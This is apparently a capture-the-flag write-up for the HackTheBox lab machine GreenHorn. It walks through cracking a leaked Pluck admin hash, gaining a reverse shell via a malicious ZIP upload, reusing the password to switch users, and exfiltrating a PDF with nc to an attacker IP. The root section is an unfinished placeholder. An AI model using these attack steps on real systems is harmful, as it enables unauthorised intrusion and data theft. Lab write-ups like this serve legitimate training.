---
title: "Hackthebox: GreenHorn [Machine] [Season 6]"
author: c3l1kd
categories: [Hackthebox]
tags:
  [
    Privilege Escalation,
    Reverse Shell,
    Nmap,
    wfuzz,
    Exploitation,
    Web Server,
  ]
render_with_liquid: false
img_path: /images/hackthebox_greenhorn/
image:
  path: room_image.png
---

**GreenHorn** is an easy machine by `HackTheBox` where we are dealing with a Pluck web application , digging around we find the source code of the web app from there we gain access to admin panel where we exploit an `RCE Vulnerability` to have the first footsteps into the host through a reverse shell we escalate our privileges with a reverse pixelation process in order to get access to the root account and pwn the box!

## Initial Enumeration
### Nmap Scan

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/GreenHorn]
└─$ nmap -sC -sV 10.10.11.25 -vv -T4 -oN greenhorn.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 16:57 BST
Nmap scan report for 10.10.11.25
Host is up, received syn-ack (0.081s latency).
Scanned at 2024-07-22 16:57:38 BST for 108s
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOp+cK9ugCW282Gw6Rqe+Yz+5fOGcZzYi8cmlGmFdFAjI1347tnkKumDGK1qJnJ1hj68bmzOONz/x1CMeZjnKMw=
|   256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZQbCc8u6r2CVboxEesTZTMmZnMuEidK9zNjkD2RGEv
80/tcp    open     http    syn-ack     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://greenhorn.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp  open     ppp?    syn-ack
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=2b902fd2ed32071b; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=hbNLRwhYbcm71RS5XEXV974Gmmg6MTcyMTY2Mzg3ODM3ODI3MzUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 22 Jul 2024 15:57:58 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=c7995b3c12500d5a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=OlKBqV4gv32ldNqNJ6Ixz5N6jgM6MTcyMTY2Mzg4NDEyOTYwOTY3MA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 22 Jul 2024 15:58:04 GMT
|_    Content-Length: 0
32783/tcp filtered unknown no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have identified `4` ports using nmap,

- **22/SSH** - (`open`)
- **80/HTTP** - (`open`)
- **3000/HTTP**- (`open`)
- **32783/UNKNOWN** - (`filtered`)

**Web Server at Port 80**
visiting the web server on port `80`, the server redirects us to `http://greenhorn.htb`, adding that to the `/etc/hosts`

```console
127.0.0.1       localhost
127.0.1.1       Voldemort
10.10.11.25     greenhorn.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Looking at the web server it seems like it’s running Pluck, a PHP CMS.

![/etc/hosts](01.png){: width="1200" height="800" }

Looking through the web server nothing seems interesting, testing for LFI it doesn’t seem to work neither. Heading to the admin panel, a password is being required and we have been given the Pluck version. As a basic intution, searching that version over exploit-db won’t help us neither.


![/etc/hosts](02.png){: width="1200" height="800" }

**Web Server at Port 3000**

As we reach a dead end on port 80, we decided to look at the port 3000 where we found a free-password Gitea repository which had the source code of the web application hosted on port 80 `GreenHorn`


![/etc/hosts](03.png){: width="1200" height="800" }

Digging through the source code looking for config files, we come across a password file located at
`http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php`

![/etc/hosts](04.png){: width="1200" height="800" }

Passing the hash to hashcat we were able to crack it and retrieve the admin password.
```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/GreenHorn]
└─$ hashcat -a0 -m1700 hash.txt /usr/share/wordlists/rockyou.txt --show
d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d[REDACTED]:[REDACTED]
```
Putting the password in `http://greenhorn.htb/login.php` we were able to `login` successfully.

![/etc/hosts](05.png){: width="1200" height="800" }

**Exploitation**
**Horizontal Escalation - user.txt**
It’s time for a reverse shell, we know that Pluck 4.7.18 is vulnerable to [RCE](https://www.exploit-db.com/exploits/51592), we can upload a malicious ZIP file that contains a PHP script that will establish a connection for us.

```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/GreenHorn]
└─$ zip reverse.zip reverse.php             
  adding: reverse.php (deflated 59%)
```
![/etc/hosts](06.png){: width="1200" height="800" }
Setting up a listener using netcat, we instantly get a shell as `www-data`!
```console
┌──(kali㉿kali)-[~/Desktop/HackTheBox/GreenHorn]
└─$ nc -lnvp 4444   
listening on [any] 4444 ...
connect to [10.10.15.7] from (UNKNOWN) [10.10.11.25] 57100
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 19:12:53 up 6 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```
Upgrading the shell to a stable one,

```console
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@greenhorn:/$ export TERM=xterm
export TERM=xterm
www-data@greenhorn:/$ ^Z
zsh: suspended  nc -lnvp 4444
                                                                                                                      
┌──(kali㉿kali)-[~/Desktop/HackTheBox/GreenHorn]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444

www-data@greenhorn:/$
```
Looking for existing users on the host, we find git and junior.

```console
www-data@greenhorn:/$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Jun 20 06:36 .
drwxr-xr-x 20 root   root   4096 Jun 20 07:06 ..
drwxr-x---  2 git    git    4096 Jun 20 06:36 git
drwxr-xr-x  3 junior junior 4096 Jun 20 06:36 junior
www-data@greenhorn:/$
```
Connecting to Junior with the password we got from cracking the hash we were able to switch to Junior’s account

```console
www-data@greenhorn:/tmp$ su junior
Password: 
junior@greenhorn:/tmp$ cd
junior@greenhorn:~$ ls
 user.txt  'Using OpenVAS.pdf'
```
Once we get access to junior we can read the `user.txt` file!

**Vertical Escalation - root.txt**

Inside the home directory of junior we can see that there is a PDF file `'Using OpenVAS.pdf'`, we transfer it to our local machine with nc

```console
junior@greenhorn:~$ nc -q 0 10.10.15.7 9000 < 'Using OpenVAS.pdf'
```

<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    .note-containers {
      max-width: 600px;
      width: 100%;
      padding: 20px;
      background-color: #28a745;
      color: white;
      border-radius: 15px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      text-align: center;
      margin: 0 auto; /* Ensures the second container is centered */
    }

    .note-containers p {
      font-size: 1.2rem;
      line-height: 1.6;
    }

    .note-containers strong {
      font-weight: bold;
      font-size: 1.3rem;
      color: #ffdd57;
    }
  </style>
</head>
<body>
  <div class="note-containers">
    <p>
      This writeup will be released <strong>soon!</strong>
    </p>
  </div>
</body>
</html>

